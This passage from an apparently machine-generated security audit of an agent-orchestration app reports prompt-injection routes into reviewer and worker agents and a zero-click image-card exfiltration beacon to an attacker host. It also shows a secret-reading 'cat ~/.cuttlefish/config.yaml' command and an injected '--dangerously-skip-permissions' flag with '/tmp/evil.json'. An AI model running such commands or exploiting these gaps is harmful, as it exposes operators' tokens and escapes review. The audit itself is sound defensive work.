- **G-06 — `config.yaml` connector secrets readable via Bash with no block. [Medium-High, Confirmed | LLM07]** `hook-endpoint.ts:33-35` secret-read roots omit `config.yaml`; `command-policy.ts:18` omits it too. `cat ~/.cuttlefish/config.yaml` → `allow`, exposing Slack/WhatsApp/email tokens. **Fix:** add `config.yaml` to secret-read roots + `HOME_SECRET_PATH`.
- **G-07 — Skill-file source bypasses span sanitization entirely. [Medium, Confirmed | LLM01/08]** (see D-F3). **Fix:** operator-provenance-based skill trust.
- **G-08 — Rate-limit engine-switch resume re-injects untrusted history unwrapped. [Medium, Likely | LLM01]** `sessions/manager.ts:326-361` — the `syncRequested` branch overwrites the screened `promptToRun` with a plain `USER: <content>` transcript rebuilt from `getMessages`, dropping markers + screening. **Fix:** re-wrap/carry screened text on resume.
- **G-09 — LLM screener output trusted as the sanitized prompt (jailbreakable filter). [Medium, Likely | LLM01]** `content-screening.ts:253-329` — reviewer `sanitizedText` flows to `workerText`. **Fix:** use the verdict only to gate; always deliver code-sanitized text.
- **G-10 — Knowledge webhook read-provider fetch sets `allowPrivateHosts:true` (SSRF) + un-provenanced RAG. [Medium, Confirmed config]** `knowledge/read/webhook.ts:42-43`, `knowledge/sinks/webhook.ts:16`. **Fix:** default private-host deny; screen retrieved items.
- **G-11 — Governance CI job enforces nothing (control theater). [Low-Medium, Confirmed]** `.github/workflows/governance.yml:14-22` runs `giles repo-check` only `if command -v giles`, which is never installed → guaranteed no-op, while `governance/giles_ruleset.yaml` reads as enforced. **Fix:** install giles or mark the check advisory.
- **G-12 — `ci.yml`/`governance.yml` lack an explicit `permissions:` block. [Low-Medium, Confirmed]** inherit default `GITHUB_TOKEN` scope (contained: `pull_request` trigger, SHA-pinned actions). **Fix:** `permissions: contents: read`.
- **G-13 — `bump-formula.yml` auto-pushes to `main` on any published release. [Low, Confirmed]** `.github/workflows/bump-formula.yml:7-8,44-49`. **Fix:** route through a PR / scope the token.
- **G-14 — Foreign-session `attach` deliberately skips ownership, widening the injection blast radius. [Low-Medium, Confirmed]** (see A-F6) `talk/delegate.ts:157-201`.
- **Held posture:** all third-party actions SHA-pinned; release/publish workflows use least-privilege `permissions` + a protected `npm-production` environment with provenance; no live secrets committed (only fixtures + a real `redact.ts`); scoped tokens HMAC-signed with `..`/case normalization; hook endpoint loopback-only + timing-safe + nonce/replay window.

### Operator-signal / workflow-GUI / design-webapp / external-API / compliance / performance (Batch H)
- **H1 — `/api/status` reports `ok` while orchestration runtime is down (green-while-broken). [High, Confirmed]** `api/routes/status.ts:225-265` builds checks for `sessions_db`/`connectors`/`engines` only — no orchestration probe — yet `org.ts:923-926` returns 409 `orchestration-*` when the runtime is unavailable. **Fix:** add an `orchestration` check row.
- **H2 — `/api/healthz` is a static 200 and populates the instances "running" column. [Medium, Confirmed]** `status.ts:217-220,194-207,297-309`. **Fix:** add a `/readyz` reflecting dependencies.
- **H3 — Connector send failures swallowed and not fed back to the reply relay (false success). [High, Confirmed]** `connectors/slack/index.ts:459-499` / `whatsapp/index.ts:211-225` catch, log, `return undefined`; `connector-reply.ts:79` ignores the return. Agent replies silently never reach the user on transient API failure. **Fix:** return success/failure; record a delivery-failure notification.
- **H4 — One malformed ticket status hides an entire department's board behind a warning. [Medium, Confirmed]** web `routes/kanban/page.tsx:92` `mapBoardTicket` throws on unknown status inside the per-dept loop caught only as a warning string (`:304-308`) → every valid ticket in that department vanishes. **Fix:** catch per-ticket + render a placeholder.
- **H5 — Board cards cannot show a running agent; `workState` hardcoded `idle` on load. [Medium, Likely]** `routes/kanban/page.tsx:99`; the reload after dispatch overwrites the optimistic "Starting…" back to idle. **Fix:** derive card `workState` from live session state.
- **H6 — Board worker silently skips all dispatch when usage is low/exhausted or off-window. [Medium, Confirmed]** `gateway/board-worker.ts:151,178-186` — quota-exhausted stops picking up TODO tickets with no operator-visible signal. **Fix:** emit a throttled "idle: reason=usage-exhausted" status.
- **H7 — IMAP client sets no socket/connect timeout on the external mailbox boundary. [Medium, Likely]** `email/client.ts:39-47,81-86`. **Fix:** explicit `socketTimeout`/`greetingTimeout` + bounded poll.
- **H8 — STT model download validated by size only, no checksum, over the network. [Medium, Confirmed]** `stt/stt.ts:128-171` accepts anything `>= expectedSize*0.9`, no SHA before `renameSync`, then "available forever." **Fix:** pin+verify SHA-256.
- **H9–H11 — Compliance honesty:** advisory Giles ruleset uses `severity: fail` (drift risk if a collector reads it as enforcement; well-disclosed in `policy.yaml`) [Low]; `docs/STRUCTURE_COMPLIANCE.md` cites a stale foreign absolute path `/home/ericl/…` + fixed date [Low]; `control/` is empty though CLAUDE.md/AGENTS.md declare "control rules under `control/`" [Low].
- **H12–H13 — Performance (measure-first HYPOTHESES, unproven):** `/api/command-center` does chatty synchronous `readFileSync`+`JSON.parse` per department + full `scanOrg()` per request (`status.ts:52-102`); kanban initial load fetches department boards **serially** (`routes/kanban/page.tsx:292-309`). Both need profiling before any fix; then cache/async-read and `Promise.all`.
- **H14 — Color-only indication of the active employee filter (WCAG 1.4.1/4.1.2). [Low, Confirmed]** `routes/kanban/page.tsx:722-745`. **Fix:** `aria-pressed` + a non-color cue.
- **Held signal controls (exemplary):** the status reconciler (`status-reconciler.ts:52-112`) does two-sweep stall confirmation, records an actionable `lastError`, and wakes the delegating parent; connector health is honest; the kanban save path refetches on error rather than trusting optimistic state.

---

## 6.5 Negative space — emergent & composition failures (Batch I)

These are failures no single lens sees because each lives at the **composition** of two subsystems, each of which looks correct alone. Several are the highest-value findings in the whole sweep.

- **I-2 — The mid_pair review gate is bypassed on every path except the first message. [High, Confirmed]** `mid-pair-orchestrator.ts:26-31` — follow-up messages (`POST /api/sessions/:id/message`), queue-replay after restart, and notification dispatch call `dispatchWebSessionRun` **directly**, bypassing the reviewer. An employee whose execution tier is `mid_pair` (operator's safety story: "every change is reviewed") is reviewed on **turn 1 only**; turns 2..N and board retries run unreviewed — *with* any `--dangerously-skip-permissions` `cliFlags`. The reviewer's presence makes dangerous config look governed when it isn't. **Fix:** route every execution turn through the tier policy, not just the first.
- **I-1 — The mid_pair "reviewer" is a write-capable agent in the project workspace fed *unscreened* peer model output. [High, Confirmed mechanism]** Composes A-F1 (read_only is prompt-only) + reviewer input = `readLastAssistantMessage()` raw implementer output (`mid-pair-orchestrator.ts:222,410,615-619`) — content-screening never runs on inter-session model text. An injection-steered implementer embeds instructions the write-capable reviewer executes against the real repo. **Fix:** enforce read_only at construction *and* treat inter-session model text as untrusted.
- **I-5 — Cross-process blind snapshot-delta corrupts the store; concurrent allocations collide on generated IDs → double-grant. [High, Confirmed]** Extends C-01: IDs are minted from a per-process `nextSeq` (`scheduler.ts:151,477,537`), so two processes hydrating the same `nextSeq=N` both mint `alloc_…_N`/`lease_…_N`; the blind delta upsert (`store-snapshot.ts:222-225`) lets one silently overwrite the other while both believe they hold the lease — **a double-grant of the same worker/quota**. `persistOrRehydrate`'s catch (`persistent-scheduler.ts:105-112`) discards all in-memory state on any store error. **Fix:** single-writer guard or DB-authoritative IDs + delta.
- **I-4 — Three subsystems do stale read-modify-write on one `transport_meta` JSON column; the safe primitive exists but is unused. [High, Confirmed]** `sessions/registry/sessions.ts:219` replaces the whole column; the atomic `patchSessionTransportMeta` (`:238-256`) is right there but unused by the hot writers: mid_pair `updateExecutionState` (`mid-pair-orchestrator.ts:636-660`), talk `persist` (`talk/attachments.ts:83-89`), attachment screening (`run-attachments.ts:199-230`) — all read in one txn, write in another. Interleaving drops fields: `talkAttachments` clobbered → wake-on-completion lost forever; or `executionPhase` reverted → board shows stale state. **Fix:** route all meta writes through `patchSessionTransportMeta`.
- **I-3 — Zero-click exfiltration beacon via unvalidated model-emitted `image`/`image-grid` card `src`. [High, Confirmed]** Extends G-02 to the renderer: `card-validate.ts:104-206` validates shape only (no scheme/host check); `web/src/routes/talk/cards/card-renderer.tsx:52-56,163-184` renders `<img src={…}>` verbatim → an `<img>` **fires on render** (unlike `link` which needs a click) → zero-click GET to an attacker host carrying model-chosen query data. The browser makes the request, sidestepping the server SSRF guard entirely. **Fix:** allowlist/proxy card URLs; disable remote-image auto-load.
- **I-6 — Filename-derived skill trust × screening fail-open × attacker-influenceable attachment path = auto-allowed destructive injection. [High, Confirmed]** Composes D-F2/D-F3/D-F4: a file at `…/skills/notes.md` (or named `skill.md`) inside a read root with destructive/exfil text → `skill_file` (`content-screening.ts:99-107`) → heuristic when the reviewer is null (`:315-317`) → `instructional_but_in_scope` → **allow** → inlined into the worker prompt. Defeated by the file's *name*, not its content; attachment `path` is request-supplied (`run-attachments.ts:311-315`). **Fix:** provenance-based skill trust + fail-closed heuristic for destructive hits.
- **I-7 — Screening is snapshot-in-time but the engine re-reads the file at run time (TOCTOU). [Medium-High, Plausible]** `content-screening.ts:365` screens once; `run-attachments.ts:365-406` re-resolves the **live path** and passes it to the engine without re-screening. A second actor swapping the file (or rewriting the unlocked `attachment.path` per I-4) between screen-time and read-time delivers unscreened bytes. **Fix:** screen at read-time or pin a content hash.
- **I-8 — Per-process cron overlap guard + unlocked `jobs.json` = duplicate concurrent runs under two daemons. [Medium, Confirmed mechanism]** `cron/scheduler.ts:19,95,114-116` overlap guard is a module-level in-memory Set; two daemons over one `CUTTLEFISH_HOME` each fire the same job concurrently; `setCronJobEnabled` (`:129-137`) is an unlocked load→mutate→save. **Fix:** cross-process lock / lease on cron.
- **I-10 — `deriveWorkState` reports never-run idle sessions as `completed` (impossible-state-shown). [Medium, Confirmed]** `shared/work-state.ts:48-55` falls through to `"completed"` for any idle session with no signal — a freshly created, never-dispatched session shows as *completed work* on the boards and `GET /api/work`. **Fix:** distinguish `idle/never-run` from `completed`.
- **I-9 — Boot recovery trusts stale orchestration continuations as "live," shielding orphans from the sweep (harmful recovery). [Medium, Plausible]** `shared/run-recovery.ts:20-42,69` — a `dispatching`/`queued` continuation whose coordinator died is skipped by generic recovery *and* may be re-dispatched by the runtime sweep, re-running work whose side effects already landed. **Fix:** reconcile ownership between the two recovery mechanisms.
- **I-11 — The card producer is an unauthenticated model→UI channel on loopback. [Medium, Plausible]** `server/auth-gate.ts:57` (no 401 by default) + no per-session ownership on which Talk session a card targets; with I-3 an injected agent posts exfil `image` cards into the operator's UI. **Fix:** authenticate/scope the card producer; bind cards to a session owner.

**Assumption that underpins many of these:** the *single local operator* premise the loopback-no-auth model rests on. On a shared/SSO host, or on an accidental double-start, that premise collapses and I-5/I-8 (cross-process) and F-01/F-05 (unauth) become live.

---

## 7. Playtest — orchestration scenarios (audit-playtest-app)

**Environment & method.** Node 22 host; the repo pins Node 24.13.0, which pnpm auto-provisions (`.pnpmrc use-node-version`). Installed deps (`pnpm install`, node-pty + better-sqlite3 built cleanly), built `@cuttlefish/contracts`, and drove the **real** route handlers, session queue, registry, delegation-enforcement, and org/hierarchy logic through vitest with injected/fake engines. **A full live-daemon browser playtest of *delegation* was not run** because the mock engine is test-only and not wired into the runtime engine registry — a real boot would try to spawn a signed-in agent CLI (the `read EIO` seam prior playtests hit). Engine-free org management (onboarding/deletion/hierarchy/authority) was exercised directly against product logic; engine-dependent delegation was exercised through the suites that inject fake engines. This is the honest split the skill prescribes when the app can't be fully launched.

### 7.1 Executed scenario suites (152 tests, all green)

| Requested scenario | Suites driven | Result |
|--------------------|---------------|--------|
| **Onboarding agents** | `org-manager-route`, `org-lifecycle`, `org-hierarchy`, `onboarding-policy`, (+create path) | 50 pass |
| **Deleting agents** | `org-delete-route` (incl. 409-with-reports, 404-unknown, matrix reportsTo), `org-lifecycle` | included above |
| **Intra-department + supervisor→worker** | `manager-delegation`, `manager-delegation-enforcement`, `delegate`, `org-worker-bridge`, `ticket-dispatch-route`, `ticket-dispatch-idempotency` | 40 pass |
| **Inter-department coordination** | `org-cross-request-route`, `org-approval-route`, `org-changes` | 12 pass |
| **Conflicts / authority / scope** | `manager-auth`, `org-policy`, `queue-cancel-scope`, `approvals` | 38 pass |
| **Supervisor↔supervisor / leader-ack** | `leader-ack-reconciler`, `orchestration-runtime-manager` | 12 pass |

These confirm the load-bearing invariants hold: a manager can edit only its own reports' model fields (not employees outside its hierarchy, not non-model fields); a session-scoped principal cannot claim another's manager identity; deleting a manager who still has reports returns **409** and keeps the file; ticket dispatch is idempotent under double-fire; a paused queue replays in order; the reconciler wakes a delegating parent on child completion.

### 7.2 Bespoke exploratory driver (curious/impatient/mistaken user)

A throwaway driver exercised the real `validateEmployeeCreate` / `createEmployeeYaml` / `resolveOrgHierarchy` / `deleteEmployeeYaml` against a temp home. **Observed (executed):**

- **Onboarding happy path:** COO (executive/exec), Engineering Lead (manager, reportsTo coo), Research Lead (manager, reportsTo coo) → all **ACCEPTED**.
- **Onboarding friction — real seam:** an employee with `engine:"claude", model:"sonnet"` was **REJECTED — `unknown model "sonnet" for engine "claude" (known: opus)`**. In a fresh environment the model registry only knows `opus` for claude until discovery/config populates it (`gateway/org.ts:387-403` + `getModelRegistry`), so onboarding an agent on a real Claude model name (`sonnet`/`haiku`/`claude-sonnet-5`) fails until the operator adds a `models:` block or discovery runs. Matches the prior playtest's static-model-discovery seam. **Impact:** confusing hard-stop during onboarding for a valid model. **Fix:** widen the seed catalog or downgrade unknown-model to a warning like the `pi` path already does (`org.ts:396-398`).
- **Malformed onboarding correctly rejected:** duplicate name (`employee "coo" already exists`), empty persona, invalid rank `overlord`, bad name chars `bad name!`, department `../../etc` (`must not contain '..' traversal`), unknown field `isAdmin`. Input validation is solid.
- **Authority/conflict:** two managers each `reportsTo` the other could **not** be created — each creation is rejected because `reportsTo` must reference an already-existing employee (`reportsTo references unknown employee(s): …`), so a mutual-report cycle can't be introduced via the create path. Cross-department reporting (lead → COO across departments) is **allowed but flagged** with a `cross_department` warning by `resolveOrgHierarchy`. Good defensive posture.
- **Security seam — confirmed live (F-02/F-10/A-F2/G-01 family):** onboarding an employee with `cliFlags: ["--dangerously-skip-permissions", "--mcp-config", "/tmp/evil.json"]` (valid model) was **ACCEPTED and persisted verbatim** — read back from the org YAML as `["--dangerously-skip-permissions","--mcp-config","/tmp/evil.json"]`. The onboarding validator (`org.ts:651-661`) checks only array-of-strings / no control chars — **no dangerous-flag denylist** — so a roster edit (or an unauth `PUT /api/config`/create) injects permission-bypass + arbitrary MCP config into the child CLI's argv. This turns the static findings into an executed reproduction.
- **Deletion via raw API:** `deleteEmployeeYaml("research-worker")`/unknown → `NOT-FOUND` (weren't created due to the model seam); deleting a manager via the **raw** `deleteEmployeeYaml` succeeds with no reports-guard — the reports/409 guard lives at the **route** layer (`org-delete-route`, already green in §7.1), so callers that bypass the route (a future CLI, a direct util call) would delete a manager and orphan reports. **Fix:** move the reports-guard into `deleteEmployeeYaml` itself, not only the route.

### 7.3 Playtest verdict

Onboarding, deletion, hierarchy, intra/inter-department routing, authority conflicts, and supervisor tiers are **functionally sound and well-guarded at the route layer**. Two real seams surfaced: the **static model catalog** blocks onboarding on valid Claude model names in a fresh env, and the **reports-guard is route-only** (raw delete has no guard). The **`cliFlags` authority-widening** finding is now confirmed by live reproduction, not just static reading.

---

## 8. Controls that held (do not "fix")

Cross-cutting evidence of careful engineering — flagged so remediation doesn't regress them: status reconciler two-sweep stall detection + parent wake; connector-health honesty + `summarizeConnectorErrors`; corrupt-DB quarantine with manifest + paused requeue that preserves `retryCount` (no infinite recover→fail loop); at-most-once email ingest with a durable `dispatching` claim + SPF/DKIM drop; upload SSRF re-validation on every redirect hop + base64/size bounds; approval/ticket double-fire guarded by atomic CAS + in-lock re-check; run-ledger terminal-state guard; memory bounds throughout; `timingSafeEqual` secret compares + `randomBytes` tokens + argv-array spawns (no `shell:true`); `/ws` rebinding/Origin/HMAC guards; SHA-pinned actions + least-privilege release workflows + provenance publish.

---

## 9. Remediation priorities

**P0 — trust-boundary composition (do first):**
1. Require gateway auth regardless of bind interface, or gate the privileged surface behind an explicit `insecureAllowUnauthenticated` flag (F-01) — this is the keystone that de-risks F-02/F-05/F-06/F-07/D-F9/D-F12.
2. Denylist/allowlist for MCP `command` (F-02) and per-employee `cliFlags` (A-F2/F-10) at config-load *and* on the spawn path; move the `cliFlags` guard onto the interactive path, not only `RealProviderAdapter`.
3. Close the Bash control-plane bypass: realpath-based write/secret-read blocks that cover Bash-class tools and `config.yaml` (F-03/G-01/G-06/F-11).
4. Content-screening: remove the "example" downgrade of destructive verdicts, fail-closed when the reviewer is absent, screen ticket resources and the email path, and derive skill-file trust from provenance (D-F1/D-F2/D-F3/D-F4/G-04/G-07/G-09).

**P1 — orchestration correctness & operator truth:**
5. Reconcile the persistent-scheduler/board deltas against the DB or enforce a single writer (C-01/C-07); CAS continuation transitions (C-03/C-04); recover all `dispatching` on boot (C-02).
6. Enforce the `read_only` reviewer at construction and default the reviewer to a different model family (A-F1/A-F7).
7. Add an orchestration health probe + a `/readyz`; feed connector-send failures back to the relay (H1/H2/H3).
8. Bound the cron overlap guard and the paused-queue wait; stop swallowing `uncaughtException` (E1/E2/E6).

**P2 — hardening & hygiene:** pin MCP versions (G-05); validate model-emitted card URLs + disable remote-image auto-load (G-02); move the delete reports-guard into the util (§7.2); widen the onboarding model catalog or warn-not-reject (§7.2); split the `gateway/org.ts` god object and derive the duplicated engine-name/column/PTY-key sets from one source (B-ARC-001, B-INV-001/002/003); STT checksum + IMAP timeout (H8/H7); a11y + governance-honesty cleanups (H9–H11, H14).

---

## 10. Coverage & limitations

- **37 audit skills applied** (Section 2); **4 documented N/A**. Findings are `file:line`-evidenced from files actually read; runtime effects labelled Likely/Potential per the audit calibration ceilings.
- **No madge/knip** import-graph tool was run — "no cycle" claims are grep-bounded.
- **No live-daemon browser playtest of delegation** (mock engine not wired to the runtime; would need a signed-in engine CLI). Org management, hierarchy, authority, and delegation-enforcement were exercised through real code with injected engines and a bespoke driver; the executed evidence is in Section 7.
- **Web XSS surface, every engine's spawn wrapper, and the SQLite/knowledge query construction** were sampled, not exhaustively read — recommended next slices.
- Prototype-pollution (F-15) is **Plausible**, not Confirmed — the classic `obj[k1][k2]=v` sink was not found; an explicit key filter is still cheap.

*Generated by the 010_audit skill pack + audit-playtest-app, 2026-07-10.*
